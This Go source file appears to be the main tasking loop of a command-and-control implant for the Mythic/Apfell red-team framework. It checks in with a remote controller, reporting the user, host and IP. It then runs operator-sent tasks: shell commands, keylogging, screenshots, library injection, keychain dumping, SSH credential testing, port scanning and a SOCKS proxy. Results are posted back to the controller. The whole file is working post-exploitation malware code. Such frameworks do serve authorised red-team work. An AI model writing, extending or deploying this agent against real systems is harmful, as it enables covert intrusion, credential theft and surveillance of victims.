package main

import (
	"C"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"strings"
	"time"

	//"log"
	"cat"
	"cp"
	"curl"
	"drives"
	"getenv"
	"getuser"
	"jxa"
	"keylog"
	"keys"
	"kill"
	"libinject"
	"list_entitlements"
	"listtasks"
	"ls"
	"mkdir"
	"mv"
	"pkg/profiles"
	"pkg/utils/functions"
	"pkg/utils/structs"
	"portscan"
	"ps"
	"pwd"
	"rm"
	"screencapture"
	"setenv"
	"shell"
	"socks"
	"sort"
	"sshauth"
	"sync"
	"triagedirectory"
	"unsetenv"
	"xpc"
)

const (
	NONE_CODE = 100
	EXIT_CODE = 0
)

var taskSlice []structs.Task
var mu sync.Mutex

//export RunMain
func RunMain() {
	main()
}

//helper to get the total size in bytes of the taskresponse slice
func totalSize(r []json.RawMessage) int {
	s := 0

	for i := 0; i < len(r); i++ {
		s = s + len(r[i])
	}

	return s
}

// Handle File upload responses from apfell
func handleFileUploadResponse(resp []byte, backgroundTasks map[string](chan []byte)) {
	var taskResp map[string]interface{}
	err := json.Unmarshal(resp, &taskResp)
	if err != nil {
		//log.Printf("Error unmarshal response to task response: %s", err.Error())
	}

	if fileid, ok := taskResp["file_id"]; ok {
		if v, exists := backgroundTasks[fileid.(string)]; exists {
			// send data to the channel
			raw, _ := json.Marshal(taskResp)
			go func() {
				v <- raw
			}()
		}
	}
}

// Handle Screenshot data
func handleScreenshot(profile profiles.Profile, task structs.Task, backgroundchannel chan []byte, dataChannel chan []screencapture.ScreenShot, backgroundTasks map[string](chan []byte)) {
	results := <-dataChannel

	for i := 0; i < len(results); i++ {
		//log.Println("Calling profile.SendFileChunks for screenshot ", i)
		profile.SendFileChunks(task, results[i].Data(), backgroundchannel)
	}

	delete(backgroundTasks, task.TaskID)
}

// Handle TaskResponses from apfell
func handleResponses(resp []byte, backgroundTasks map[string](chan []byte)) {
	// Handle the response from apfell
	taskResp := structs.TaskResponseMessageResponse{}
	err := json.Unmarshal(resp, &taskResp)
	if err != nil {
		//log.Printf("Error unmarshal response to task response: %s", err.Error())
		return
	}

	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
	for i := 0; i < len(taskResp.Responses); i++ {
		var r map[string]interface{}
		err := json.Unmarshal([]byte(taskResp.Responses[i]), &r)
		if err != nil {
			//log.Printf("Error unmarshal response to task response: %s", err.Error())
			break
		}

		//log.Printf("Handling response from apfell: %+v\n", r)
		if taskid, ok := r["task_id"]; ok {
			if v, exists := backgroundTasks[taskid.(string)]; exists {
				// send data to the channel
				if exists {
					//log.Println("Found background task that matches task_id ", taskid.(string))
					raw, _ := json.Marshal(r)
					go func() {
						v <- raw
					}()
					continue
				}
			}
		}
	}

	return
}

func main() {

	// Initialize the  agent and check in
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	currIP := functions.GetCurrentIPAddress()
	currPid := os.Getpid()
	OperatingSystem := functions.GetOS()
	arch := functions.GetArchitecture()
	p := profiles.NewInstance()
	profile := p.(profiles.Profile)
	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
	// fmt.Println(currentUser.Name)
	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname, OperatingSystem, arch)
	checkIn := resp.(structs.CheckInMessageResponse)
	profile.SetApfellID(checkIn.ID)

	tasktypes := map[string]int{
		"exit":              EXIT_CODE,
		"shell":             1,
		"screencapture":     2,
		"keylog":            3,
		"download":          4,
		"upload":            5,
		"libinject":         6,
		"ps":                8,
		"sleep":             9,
		"cat":               10,
		"cd":                11,
		"ls":                12,
		"python":            13,
		"jxa":               14,
		"keys":              15,
		"triagedirectory":   16,
		"sshauth":           17,
		"portscan":          18,
		"jobs":              21,
		"jobkill":           22,
		"cp":                23,
		"drives":            24,
		"getuser":           25,
		"mkdir":             26,
		"mv":                27,
		"pwd":               28,
		"rm":                29,
		"getenv":            30,
		"setenv":            31,
		"unsetenv":          32,
		"kill":              33,
		"curl":              34,
		"xpc":               35,
		"socks":             36,
		"listtasks":         37,
		"list_entitlements": 38,
		"none":              NONE_CODE,
	}

	// Map used to handle go routines that are waiting for a response from apfell to continue
	backgroundTasks := make(map[string](chan []byte))
	//if we have an Active apfell session, enter the tasking loop
	if strings.Contains(checkIn.Status, "success") {
		var fromMythicSocksChannel = make(chan structs.SocksMsg, 1000) // our channel for Socks
		var toMythicSocksChannel = make(chan structs.SocksMsg, 1000)   // our channel for Socks
	LOOP:
		for {
			//log.Println("sleeping")
			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)

			// Get the next task
			t := profile.GetTasking()
			task := t.(structs.TaskRequestMessageResponse)
			/*
				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
				This check is to make sure we're running a "killable" process, and if so, add it to the queue.
				The supported processes are:
					- executeassembly
					- triagedirectory
					- portscan
			*/

			// sort the Tasks
			sort.Slice(task.Tasks, func(i, j int) bool {
				return task.Tasks[i].Timestamp < task.Tasks[j].Timestamp
			})
			// take any Socks messages and ship them off to the socks go routines
			for j := 0; j < len(task.Socks); j++ {
				fromMythicSocksChannel <- task.Socks[j]
			}
			for j := 0; j < len(task.Tasks); j++ {
				if tasktypes[task.Tasks[j].Command] == 3 || tasktypes[task.Tasks[j].Command] == 16 || tasktypes[task.Tasks[j].Command] == 18 {
					// log.Println("Making a job for", task.Command)
					job := &structs.Job{
						KillChannel: make(chan int),
						Stop:        new(int),
						Monitoring:  false,
					}
					task.Tasks[j].Job = job
					taskSlice = append(taskSlice, task.Tasks[j])
				}
				switch tasktypes[task.Tasks[j].Command] {
				case EXIT_CODE:
					// Throw away the response, we don't really need it for anything
					resp := structs.Response{}
					resp.UserOutput = "exiting"
					resp.Completed = true
					resp.TaskID = task.Tasks[j].TaskID
					encResp, err := json.Marshal(resp)
					if err != nil {
						//log.Println("Error marshaling exit response: ", err.Error())
						break
					}

					mu.Lock()
					profiles.TaskResponses = append(profiles.TaskResponses, encResp)
					mu.Unlock()

					break LOOP
				case 1:
					// Run shell command
					go shell.Run(task.Tasks[j])
					break
				case 2:
					// Capture screenshot
					backgroundTasks[task.Tasks[j].TaskID] = make(chan []byte)
					dataChan := make(chan []screencapture.ScreenShot)
					go screencapture.Run(task.Tasks[j], dataChan)
					go handleScreenshot(profile, task.Tasks[j], backgroundTasks[task.Tasks[j].TaskID], dataChan, backgroundTasks)

					break
				case 3:
					go keylog.Run(task.Tasks[j])
					break
				case 4:
					//File download
					backgroundTasks[task.Tasks[j].TaskID] = make(chan []byte)
					go profile.SendFile(task.Tasks[j], task.Tasks[j].Params, backgroundTasks[task.Tasks[j].TaskID])
					break
				case 5:
					// File upload
					fileDetails := structs.FileUploadParams{}

					err := json.Unmarshal([]byte(task.Tasks[j].Params), &fileDetails)
					if err != nil {
						//log.Println("Error in unmarshal: ", err.Error())
						errResp := structs.Response{}
						errResp.Completed = false
						errResp.TaskID = task.Tasks[j].TaskID
						errResp.Status = "error"
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						mu.Lock()
						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
						mu.Unlock()

						break
					}

					backgroundTasks[fileDetails.FileID] = make(chan []byte)
					//log.Println("Added to backgroundTasks with file id: ", fileDetails.FileID)
					go profile.GetFile(task.Tasks[j], fileDetails, backgroundTasks[fileDetails.FileID])
					break

				case 6:
					go libinject.Run(task.Tasks[j])
					break
				case 8:
					go ps.Run(task.Tasks[j])
					break
				case 9:
					// Sleep
					type Args struct {
						Interval int `json:"interval"`
						Jitter   int `json:"jitter"`
					}

					args := Args{}
					err := json.Unmarshal([]byte(task.Tasks[j].Params), &args)

					if err != nil {
						errResp := structs.Response{}
						errResp.Completed = false
						errResp.TaskID = task.Tasks[j].TaskID
						errResp.Status = "error"
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						mu.Lock()
						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
						mu.Unlock()
						break
					}
					output := ""
					if args.Interval >= 0 {
						profile.SetSleepInterval(args.Interval)
						output += "Sleep interval updated\n"
					}
					if args.Jitter >= 0 {
						profile.SetSleepJitter(args.Jitter)
						output += "Jitter interval updated\n"
					}
					resp := structs.Response{}
					resp.UserOutput = output
					resp.Completed = true
					resp.TaskID = task.Tasks[j].TaskID
					encResp, err := json.Marshal(resp)
					if err != nil {
						errResp := structs.Response{}
						errResp.Completed = false
						errResp.TaskID = task.Tasks[j].TaskID
						errResp.Status = "error"
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						mu.Lock()
						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
						mu.Unlock()
						break
					}
					mu.Lock()
					profiles.TaskResponses = append(profiles.TaskResponses, encResp)
					mu.Unlock()

					break
				case 10:
					//Cat a file
					go cat.Run(task.Tasks[j])
					break
				case 11:
					//Change cwd
					err := os.Chdir(task.Tasks[j].Params)
					msg := structs.Response{}
					msg.TaskID = task.Tasks[j].TaskID
					if err != nil {
						errResp := structs.Response{}
						errResp.Completed = false
						errResp.TaskID = task.Tasks[j].TaskID
						errResp.Status = "error"
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						mu.Lock()
						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
						mu.Unlock()
						break
					}

					msg.UserOutput = fmt.Sprintf("changed directory to: %s", task.Tasks[j].Params)
					msg.Completed = true
					encResp, err := json.Marshal(msg)
					if err != nil {
						errResp := structs.Response{}
						errResp.Completed = false
						errResp.TaskID = task.Tasks[j].TaskID
						errResp.Status = "error"
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						mu.Lock()
						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
						mu.Unlock()
						break
					}
					mu.Lock()
					profiles.TaskResponses = append(profiles.TaskResponses, encResp)
					mu.Unlock()

					break
				case 12:
					//List directory contents
					go ls.Run(task.Tasks[j])
					break
				case 14:
					//Execute jxa code in memory
					go jxa.Run(task.Tasks[j])
					break
				case 15:
					// Enumerate keyring data for linux or the keychain for macos
					go keys.Run(task.Tasks[j])
					break
				case 16:
					// Triage a directory and organize files by type
					go triagedirectory.Run(task.Tasks[j])
					break
				case 17:
					// Test credentials against remote hosts
					go sshauth.Run(task.Tasks[j])
					break
				case 18:
					// Scan ports on remote hosts.
					go portscan.Run(task.Tasks[j])
					break
				case 21:
					// Return the list of jobs.

					msg := structs.Response{}
					msg.TaskID = task.Tasks[j].TaskID
					//log.Println("Number of tasks processing:", len(taskSlice))
					//fmt.Println(taskSlice)
					// For graceful error handling server-side when zero jobs are processing.
					if len(taskSlice) == 0 {
						msg.Completed = true
						msg.UserOutput = "0 jobs"
					} else {
						var jobList []structs.TaskStub
						for _, x := range taskSlice {
							jobList = append(jobList, x.ToStub())
						}
						jsonSlices, err := json.MarshalIndent(jobList, "", "	")
						//log.Println("Finished marshalling tasks into:", string(jsonSlices))
						if err != nil {
							//log.Println("Failed to marshal :'(")
							//log.Println(err.Error())
							msg.UserOutput = err.Error()
							msg.Completed = true
							msg.Status = "error"

						} else {
							msg.UserOutput = string(jsonSlices)
							msg.Completed = true
						}

					}
					rawmsg, _ := json.Marshal(msg)
					mu.Lock()
					profiles.TaskResponses = append(profiles.TaskResponses, rawmsg)
					mu.Unlock()

					//log.Println("returned!")
					break
				case 22:
					// Kill the job
					msg := structs.Response{}
					msg.TaskID = task.Tasks[j].TaskID

					foundTask := false
					for _, taskItem := range taskSlice {
						if taskItem.TaskID == task.Tasks[j].Params {
							go taskItem.Job.SendKill()
							foundTask = true
						}
					}

					if foundTask {
						msg.UserOutput = fmt.Sprintf("Sent kill signal to Job ID: %s", task.Tasks[j].Params)
						msg.Completed = true
					} else {
						msg.UserOutput = fmt.Sprintf("No job with ID: %s", task.Tasks[j].Params)
						msg.Completed = true
					}

					rawmsg, _ := json.Marshal(msg)
					mu.Lock()
					profiles.TaskResponses = append(profiles.TaskResponses, rawmsg)
					mu.Unlock()
					break
				case 23:
					// copy a file!
					go cp.Run(task.Tasks[j])
					break
				case 24:
					// List drives on a machine
					go drives.Run(task.Tasks[j])
					break
				case 25:
					// Retrieve information about the current user.
					go getuser.Run(task.Tasks[j])
					break
				case 26:
					// Make a directory
					go mkdir.Run(task.Tasks[j])
					break
				case 27:
					// Move files
					go mv.Run(task.Tasks[j])
					break
				case 28:
					// Print working directory
					go pwd.Run(task.Tasks[j])
					break
				case 29:
					go rm.Run(task.Tasks[j])
					break
				case 30:
					go getenv.Run(task.Tasks[j])
					break
				case 31:
					go setenv.Run(task.Tasks[j])
					break
				case 32:
					go unsetenv.Run(task.Tasks[j])
					break
				case 33:
					go kill.Run(task.Tasks[j])
					break
				case 34:
					go curl.Run(task.Tasks[j])
					break
				case 35:
					go xpc.Run(task.Tasks[j])
					break
				case 36:
					type Args struct {
						Action string `json:"action"`
						Port   int    `json:"port"`
					}

					args := Args{}
					err := json.Unmarshal([]byte(task.Tasks[j].Params), &args)

					if err != nil {
						errResp := structs.Response{}
						errResp.Completed = false
						errResp.TaskID = task.Tasks[j].TaskID
						errResp.Status = "error"
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						mu.Lock()
						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
						mu.Unlock()
						break
					}

					go socks.Run(task.Tasks[j], fromMythicSocksChannel, toMythicSocksChannel)
					resp := structs.Response{}
					resp.UserOutput = "Socks started"
					resp.Completed = true
					resp.TaskID = task.Tasks[j].TaskID
					encResp, err := json.Marshal(resp)
					if err != nil {
						errResp := structs.Response{}
						errResp.Completed = false
						errResp.TaskID = task.Tasks[j].TaskID
						errResp.Status = "error"
						errResp.UserOutput = err.Error()

						encErrResp, _ := json.Marshal(errResp)
						mu.Lock()
						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
						mu.Unlock()
						break
					}
					mu.Lock()
					profiles.TaskResponses = append(profiles.TaskResponses, encResp)
					mu.Unlock()
					break

				case 37:
					go listtasks.Run(task.Tasks[j])
					break
				case 38:
					go list_entitlements.Run(task.Tasks[j])
					break
				case NONE_CODE:
					// No tasks, do nothing
					break
				}
			}

			// loop through all task responses

			responseMsg := structs.TaskResponseMessage{}
			responseMsg.Action = "post_response"
			responseMsg.Socks = getSocksChannelData(toMythicSocksChannel)
			if len(responseMsg.Socks) > 0 || len(profiles.TaskResponses) > 0 {
				responseMsg.Responses = make([]json.RawMessage, 0)
				responseMsg.Delegates = make([]json.RawMessage, 0)
				mu.Lock()
				responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses...)
				profiles.TaskResponses = make([]json.RawMessage, 0)
				mu.Unlock()
				encResponse, _ := json.Marshal(responseMsg)
				//log.Printf("Response to apfell: %s\n", encResponse)
				// Post all responses to apfell
				resp := profile.PostResponse(encResponse, true)
				if len(resp) > 0 {
					//log.Printf("Raw resp: \n %s", string(resp))
					go handleResponses(resp, backgroundTasks)
				}
			}
			// Iterate over file uploads
			if len(profiles.UploadResponses) > 0 {
				var uploadMsg json.RawMessage
				if len(profiles.UploadResponses) > 1 {
					// Pop from the front if there is more than one
					uploadMsg, profiles.UploadResponses = profiles.UploadResponses[0], profiles.UploadResponses[1:]
				} else {
					uploadMsg = profiles.UploadResponses[0]
					profiles.UploadResponses = make([]json.RawMessage, 0)
				}
				//encResponse, _ := json.Marshal(uploadMsg)
				// Post all responses to apfell
				resp := profile.PostResponse([]byte(uploadMsg), true)
				if len(resp) > 0 {
					go handleFileUploadResponse(resp, backgroundTasks)
				}

			}
		}

		// loop through all task responses before exiting

		responseMsg := structs.TaskResponseMessage{}
		responseMsg.Action = "post_response"
		responseMsg.Responses = make([]json.RawMessage, 0)
		responseMsg.Delegates = make([]json.RawMessage, 0)
		responseMsg.Socks = getSocksChannelData(toMythicSocksChannel)
		size := 512000 // Set the chunksize
		// Chunk the response
		for j := 0; j < len(profiles.TaskResponses); j++ {
			if len(profiles.TaskResponses[j]) < size {
				responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
			} else if len(responseMsg.Responses) < 1 && len(profiles.TaskResponses[j]) > size { // If the response is bigger than chunk size and there aren't any responses in responseMsg.Responses
				responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
				if j < len(profiles.TaskResponses)-1 {
					profiles.TaskResponses = profiles.TaskResponses[j+1:]
				} else {
					profiles.TaskResponses = make([]json.RawMessage, 0)
				}
				break
			} else if len(responseMsg.Responses) > 0 && len(profiles.TaskResponses[j]) > size {
				profiles.TaskResponses = profiles.TaskResponses[j:]
				break
			}

			if len(responseMsg.Responses) == len(profiles.TaskResponses) {
				profiles.TaskResponses = make([]json.RawMessage, 0)
				break
			}
			size = size - len(profiles.TaskResponses[j])
		}

		encResponse, _ := json.Marshal(responseMsg)
		// Post all responses to apfell
		_ = profile.PostResponse(encResponse, true)

	}
}

func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.SocksMsg {
	var data = make([]structs.SocksMsg, 0)
	for {
		select {
		case msg, ok := <-toMythicSocksChannel:
			if ok {
				//fmt.Printf("Value %d was read for post_response.\n", msg)
				data = append(data, msg)
			} else {
				//fmt.Println("Channel closed!")
				return data
			}
		default:
			//fmt.Println("No value ready, moving on.")
			return data
		}
	}
}
